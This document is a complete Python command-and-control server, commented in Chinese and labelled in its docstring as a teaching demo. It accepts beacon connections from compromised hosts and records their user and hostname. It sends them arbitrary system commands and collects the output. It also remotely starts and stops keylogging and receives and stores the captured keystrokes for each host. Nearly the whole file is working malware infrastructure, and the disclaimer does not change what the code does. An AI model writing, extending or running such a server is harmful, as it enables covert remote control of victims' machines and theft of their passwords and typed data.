#!/usr/bin/env python3
"""
C2 远控服务端

功能：
  1. 接收 Beacon 连接，管理上线主机
  2. 远程下发指令（任意系统命令）
  3. 键盘记录启停管控
  4. 统一接收、存储、展示键盘数据
  5. 提供 API 供控制台调用

安全警告：此程序为安全教学演示用的 C2 服务端！
         严禁用于任何非授权场景！
"""

import socket
import threading
import json
import time
import os
import base64
from datetime import datetime

# ========== 配置 ==========
C2_HOST = '0.0.0.0'
C2_PORT = 8888
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')

# ========== 全局状态 ==========
shells = {}          # shell_id -> {socket, info, keylog_data, connected_time}
shell_counter = 0
shells_lock = threading.Lock()
keylog_store = []    # 全部键盘记录数据 [(time, shell_id, hostname, data)]
keylog_lock = threading.Lock()
alerts = []          # 事件日志
alerts_lock = threading.Lock()


def log_alert(level, message):
    """记录事件"""
    global alerts
    with alerts_lock:
        alerts.append({
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'level': level,
            'message': message
        })
        # 只保留最近 200 条
        if len(alerts) > 200:
            alerts[:] = alerts[-200:]


def _recv_command_response(conn, timeout=30):
    """接收一个完整的命令响应"""
    conn.settimeout(timeout)
    buf = []
    while True:
        try:
            data = conn.recv(8192)
        except socket.timeout:
            return None
        if not data:
            return None
        buf.append(data.decode(errors='replace'))
        full = ''.join(buf)
        if full.startswith('CMD_RESULT\n'):
            if '__END__\n' in full:
                return full
        elif '\n' in full:
            return full


def _process_beacon_message(shell_id, message):
    """解析并处理 Beacon 返回的消息，返回 True 表示已处理为状态消息"""
    if not message:
        return True

    if message == 'pong':
        return True

    if message == 'HEARTBEAT':
        return True

    if message.startswith('KEYLOG started'):
        with shells_lock:
            if shell_id in shells:
                shells[shell_id]['keylog_active'] = True
        log_alert('WARN', '[!] Shell#{} 键盘记录已启动'.format(shell_id))
        print('[!] Shell#{} 键盘记录已启动'.format(shell_id))
        return True

    if message.startswith('KEYLOG stopped'):
        with shells_lock:
            if shell_id in shells:
                shells[shell_id]['keylog_active'] = False
        log_alert('INFO', '[*] Shell#{} 键盘记录已停止'.format(shell_id))
        print('[*] Shell#{} 键盘记录已停止'.format(shell_id))
        return True

    if message.startswith('KEYLOG_DATA '):
        encoded = message[12:]
        try:
            decoded = base64.b64decode(encoded).decode(errors='replace')
        except Exception:
            decoded = encoded

        hostname = 'unknown'
        with shells_lock:
            if shell_id in shells:
                hostname = shells[shell_id]['info']['hostname']
                shells[shell_id]['keylog_buffer'] += decoded
                shells[shell_id]['keylog_result'] = decoded

        with keylog_lock:
            keylog_store.append({
                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'shell_id': shell_id,
                'hostname': hostname,
                'data': decoded,
            })

        log_alert('WARN', '[!] Shell#{} 回传键盘数据: {} chars'.format(
            shell_id, len(decoded)
        ))
        print('[!] Shell#{} 键盘数据: {}'.format(shell_id, decoded[:100]))
        return True

    if message.startswith('CMD_RESULT\n'):
        # 命令结果，存入 command_result 供控制台读取
        start = message.index('CMD_RESULT\n') + len('CMD_RESULT\n')
        end = message.rfind('__END__')
        if end > start:
            result = message[start:end].strip()
        else:
            result = message
        with shells_lock:
            if shell_id in shells:
                shells[shell_id]['command_result'] = result
        return True

    if message == 'bye':
        return None  # 表示 Beacon 请求断开

    # 其他未知消息，也作为命令结果返回
    with shells_lock:
        if shell_id in shells:
            shells[shell_id]['command_result'] = message
    return True


def handle_beacon(conn, addr):
    """处理 Beacon 连接"""
    global shell_counter

    # 分配 shell_id
    with shells_lock:
        shell_counter += 1
        shell_id = shell_counter

    # 等待注册信息
    beacon_info = {
        'hostname': 'unknown',
        'user': 'unknown',
        'cwd': '/',
        'pid': 0,
        'addr': '{}:{}'.format(addr[0], addr[1]),
    }

    try:
        conn.settimeout(10)
        reg_data = conn.recv(4096).decode(errors='replace').strip()
        if reg_data:
            try:
                info = json.loads(reg_data)
                if info.get('type') == 'register':
                    beacon_info.update({
                        'hostname': info.get('hostname', 'unknown'),
                        'user': info.get('user', 'unknown'),
                        'cwd': info.get('cwd', '/'),
                        'pid': info.get('pid', 0),
                    })
            except json.JSONDecodeError:
                pass
    except socket.timeout:
        pass
    except Exception:
        pass

    # 注册 shell
    with shells_lock:
        shells[shell_id] = {
            'socket': conn,
            'info': beacon_info,
            'keylog_active': False,
            'connected_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'keylog_buffer': '',
            'pending_command': None,
            'command_result': None,
            'keylog_result': None,
        }

    log_alert('INFO', '[+] Shell#{} 上线: {}@{} ({})'.format(
        shell_id, beacon_info['user'], beacon_info['hostname'], beacon_info['addr']
    ))
    print('[+] Shell#{} 上线: {}@{} ({})'.format(
        shell_id, beacon_info['user'], beacon_info['hostname'], beacon_info['addr']
    ))

    # 通信循环：
    # 1. 检查是否有控制台下发的命令，有则发送并接收响应
    # 2. 没有命令时，阻塞接收 Beacon 心跳/数据
    while True:
        try:
            # 检查待执行命令
            pending = None
            with shells_lock:
                if shell_id in shells:
                    shells[shell_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    pending = shells[shell_id]['pending_command']
                    shells[shell_id]['pending_command'] = None

            if pending:
                conn.sendall((pending + '\n').encode())
                response = _recv_command_response(conn, timeout=30)
                if response is None:
                    break
                status = _process_beacon_message(shell_id, response)
                if status is None:
                    break
                continue

            # 没有命令，等待 Beacon 主动数据（心跳等）
            conn.settimeout(2)
            data = conn.recv(8192)
            if not data:
                break
            message = data.decode(errors='replace').strip()
            status = _process_beacon_message(shell_id, message)
            if status is None:
                break

        except socket.timeout:
            continue
        except ConnectionResetError:
            break
        except BrokenPipeError:
            break
        except Exception as e:
            log_alert('ERROR', 'Shell#{} 通信错误: {}'.format(shell_id, e))
            break

    # 清理断开的连接
    with shells_lock:
        if shell_id in shells:
            del shells[shell_id]
    try:
        conn.close()
    except Exception:
        pass

    log_alert('WARN', '[-] Shell#{} 离线: {}@{}'.format(
        shell_id, beacon_info['user'], beacon_info['hostname']
    ))
    print('[-] Shell#{} 离线'.format(shell_id))


def start_server():
    """启动 C2 服务器"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((C2_HOST, C2_PORT))
    server.listen(10)

    # 创建数据目录
    os.makedirs(DATA_DIR, exist_ok=True)

    log_alert('INFO', '[*] C2 服务器启动在 {}:{}'.format(C2_HOST, C2_PORT))
    print('=' * 50)
    print('  C2 远控服务端')
    print('  监听: {}:{}'.format(C2_HOST, C2_PORT))
    print('=' * 50)
    print('[*] 等待 Beacon 连接...\n')

    while True:
        try:
            conn, addr = server.accept()
            t = threading.Thread(target=handle_beacon, args=(conn, addr), daemon=True)
            t.start()
        except Exception as e:
            log_alert('ERROR', '服务器错误: {}'.format(e))
            print('[!] 服务器错误: {}'.format(e))


# ========== API 函数（供控制台调用） ==========

def get_shells():
    """获取所有在线 shell"""
    with shells_lock:
        result = {}
        for sid, sdata in shells.items():
            result[sid] = {
                'hostname': sdata['info']['hostname'],
                'user': sdata['info']['user'],
                'addr': sdata['info']['addr'],
                'connected_time': sdata['connected_time'],
                'last_seen': sdata['last_seen'],
                'keylog_active': sdata['keylog_active'],
            }
        return result


def send_command(shell_id, command):
    """向指定 shell 发送命令"""
    with shells_lock:
        if shell_id not in shells:
            return False, 'Shell#{} 不存在或已离线'.format(shell_id)
        if shells[shell_id]['pending_command'] is not None:
            return False, 'Shell#{} 有未完成的命令'.format(shell_id)
        shells[shell_id]['pending_command'] = command
        shells[shell_id]['command_result'] = None
        return True, 'OK'


def recv_command_result(shell_id, timeout=15):
    """接收命令执行结果"""
    start = time.time()
    while time.time() - start < timeout:
        with shells_lock:
            if shell_id not in shells:
                return False, 'Shell#{} 不存在或已离线'.format(shell_id)
            result = shells[shell_id]['command_result']
            if result is not None:
                shells[shell_id]['command_result'] = None
                return True, result
        time.sleep(0.2)
    return False, 'Timeout waiting for result'


def recv_keylog_result(shell_id, timeout=15):
    """等待并接收 Beacon 回传的键盘数据"""
    start = time.time()
    while time.time() - start < timeout:
        with shells_lock:
            if shell_id not in shells:
                return False, 'Shell#{} 不存在或已离线'.format(shell_id)
            result = shells[shell_id]['keylog_result']
            if result is not None:
                shells[shell_id]['keylog_result'] = None
                return True, result
        time.sleep(0.2)
    return False, 'Timeout waiting for keylog data'


def get_keylog_data():
    """获取所有键盘记录数据"""
    with keylog_lock:
        return list(keylog_store)


def get_shell_keylog(shell_id):
    """获取指定 shell 的键盘记录缓冲"""
    with shells_lock:
        if shell_id in shells:
            return True, shells[shell_id]['keylog_buffer']
        return False, 'Shell#{} 不存在'.format(shell_id)


def get_alerts():
    """获取事件日志"""
    with alerts_lock:
        return list(alerts)


def clear_keylog():
    """清空键盘记录"""
    with keylog_lock:
        keylog_store.clear()
    with shells_lock:
        for sid in shells:
            shells[sid]['keylog_buffer'] = ''
    return True


if __name__ == '__main__':
    # 独立运行时仅启动服务器
    try:
        start_server()
    except KeyboardInterrupt:
        print('\n[*] C2 服务器已停止')
